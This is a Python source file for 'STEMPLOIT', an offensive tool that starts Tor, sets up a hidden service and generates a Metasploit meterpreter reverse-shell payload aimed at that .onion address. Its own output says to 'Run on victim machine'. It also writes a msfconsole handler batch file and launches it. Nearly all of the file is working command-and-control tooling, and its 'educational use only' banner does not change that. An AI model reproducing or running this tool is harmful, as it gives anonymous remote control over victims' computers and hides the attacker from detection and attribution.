import os
import time
import subprocess
import shutil
import signal
import argparse
from stem.control import Controller
from termcolor import colored
from subprocess import check_output


def parse_arguments():
    parser = argparse.ArgumentParser(description='Parsing Arguments for STEMPLOIT Framework')
    parser.add_argument(
        '--exploit', '-ex', type=str, required=False,
        metavar='exploit', default='exploit/multi/handler',
        help='expects an exploit setup usage <name|term|index>'
    )
    parser.add_argument(
        '--payload', '-p', type=str, required=False,
        metavar='payload', default='python/meterpreter_reverse_http',
        help='expects a meterpreter payload module to target exploitation'
    )
    parser.add_argument(
        '--local-port', '-lp', type=int, required=False,
        metavar='local_port', default=5000,
        help='expects a local port number for local connection binding'
    )
    parser.add_argument(
        '--remote-port', '-rp', type=int, required=False,
        metavar='remote_port', default=80,
        help='expects a remote port number for a reverse server connection'
    )
    parser.add_argument(
        '--local-host', '-lh', type=str, required=False,
        metavar='local_host', default='127.0.0.1',
        help='expects a local address of the controlling server'
    )
    parser.add_argument(
        '--payload-outfile', '-of', type=str, required=False,
        metavar='payload_outfile', default='payload.py',
        help='expects a FILENAME for a STDOUT to save the generated payload'
    )
    parser.add_argument(
        '--onion-ftp', '-oftp', type=bool, required=False,
        metavar='onion_ftp', default=False,
        help='expects a state change from False to True , then will upload a file using ftp via TOR'
    )
    return parser.parse_args()


def generate_rc_payload(hostname, payload, output):
    """Generating msfvenom payload"""
    # Check if msfvenom is installed
    rc = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
    if rc:
        print('\n')
        print('[!] Unable to find msfvenom! Exiting..')
        exit(0)
    print(" * Generating msfvenom %s payload.." % payload)
    print('\n')
    # Append .ws Tor2Web extension
    lhost = hostname + ".ws"
    # Generate payload
    msfvenom_cmd = "msfvenom -p %s LHOST=%s LPORT=80 > %s" % (payload, lhost, output)
    subprocess.call(msfvenom_cmd, stdout=subprocess.PIPE, shell=True)
    print(" * payload generated in %s - Run on victim machine" % output)


def generate_msfc_batch(exploit, payload, lhost, lport):
    """Generate metasploit batch .rc file"""
    with open('msfconsole.rc', 'w') as f:
        f.write("use %s\n" % exploit)
        f.write("set PAYLOAD %s\n" % payload)
        f.write("set LHOST %s\n" % lhost)
        f.write("set LPORT %d\n" % lport)
        f.write("exploit -jz\n")

    print(" * batch file generated in " + os.getcwd() + "/msfconsole.rc")
    print('\n')
    # Asking for valid response
    while True:
        response = input("[!] Start msfconsole now? [yes/no] ")
        if not response.isalpha():
            continue
        if response == 'yes' or response == 'no':
            break

    if response == 'yes':
        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r msfconsole.rc'])


def generate_onionshare_stager():
    try:
        rc = subprocess.call(['which onionshare'])
    except Exception as e:
        rc = e


def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost=None, output=None, onion_ftp=False):
    # Check if tor is installed
    try:
        rc = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
    except Exception as e:
        rc = e
    if rc:
        print('\n')
        print('[!] Unable to find tor! Exiting..')
        exit(0)
    else:
        # Start tor
        print(' * Starting tor network..')
        os.system("service tor start")
        os.system("tor --quiet &")
    # Give some time to start tor circuit.
    time.sleep(6)
    with Controller.from_port() as controller:
        controller.authenticate()
        # Create a directory for hidden service
        hidden_service_dir = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service_data')
        # Create a hidden service where visitors of port 80 get redirected to local
        # port 5000
        try:
            print(" * Creating hidden service in %s" % hidden_service_dir)
            result = controller.create_hidden_service(hidden_service_dir, rport, target_port=lport)
        except:
            print("[!] Unable to connect ! Is tor running and dir writable? Exiting..")
            exit(0)

        # Check if onion_ftp is needed
        if onion_ftp:
            generate_onionshare_stager()
        # The hostname is only available when we can read the hidden service
        # directory. This requires us to be running with the same user as tor process.
        if result.hostname:
            print(" * Service is available at %s redirecting to local port %d" % (result.hostname, lport))
            # Generate payload
            generate_rc_payload(result.hostname, payload, output)
            # Generate metasploit batch file
            generate_msfc_batch(exploit, payload, lhost, lport)
            print('\n')
        else:
            print(
                "* Unable to determine our service's hostname, probably due to being unable to read the hidden "
                "service directory. Exiting..")
            exit(0)

        try:
            input("\x1b[6;30;42m * RUNNING - <enter> to quit\x1b[0m")
        finally:
            # Shut down the hidden service and clean it off disk. Note that you *don't*
            # want to delete the hidden service directory if you'd like to have this
            # same *.onion address in the future.
            print(" * Shutting down hidden service and clean it off disk")
            controller.remove_hidden_service(hidden_service_dir)
            shutil.rmtree(hidden_service_dir)
            print(" * Shutting down tor")
            os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
            os.system("service tor stop")


def stemploit_main():
    print("""\033[91m 
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
      ░░██████╗░██████████╗░█████╗░████░░░░░████╗░██████╗░░██╗░░░░░░█████╗░░████╗░██████████╗░░
      ░░██╔═══╝░██╔═██╔═██║░██╔══╝░█████░░░█████║░██╔══██╗░██║░░░░░██╔══██╗░╚██╔╝░██╔═██╔═██║░░
      ░░██████╗░╚═╝░██║░╚═╝░█████╗░██╔═██░██╔═██║░██████╔╝░██║░░░░░██║░░██║░░██║░░╚═╝░██║░╚═╝░░
      ░░╚═══██║░░░░░██║░░░░░██╔══╝░██║░╚███╔╝░██║░██╔═══╝░░██║░░░░░██║░░██║░░██║░░░░░░██║░░░░░░
      ░░██████║░░░░████╗░░░░█████╗░███╗░╚══╝░███║░██║░░░░░░██████╗░╚█████╔╝░████╗░░░░████╗░░░░░
      ░░╚═════╝░░░░╚═══╝░░░░╚════╝░╚══╝░░░░░░╚══╝░╚═╝░░░░░░╚═════╝░░╚════╝░░╚═══╝░░░░╚═══╝░░░░░
      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
        \x1b[91m""")
    print(colored("\t\tMeterpreter Reverse shell on TOR using hidden services", 'red'))
    print(colored("\t\tT0x1cEnv31ope@ctemplar.com | For educational use only", 'red'))
    print(colored("\t\tmany thanks to ~<| calfcrusher |>~", 'yellow'))
    print('\n')
    time.sleep(2)
    arguments = parse_arguments()
    parameters_handler(
        exploit=arguments.exploit,
        payload=arguments.payload,
        lport=arguments.local_port,
        rport=arguments.remote_port,
        lhost=arguments.local_host,
        output=arguments.payload_outfile,
        onion_ftp=arguments.onion_ftp
    )


if __name__ == '__main__':
    os.system('cls') if os.name == 'nt' else os.system('clear')
    stemploit_main()
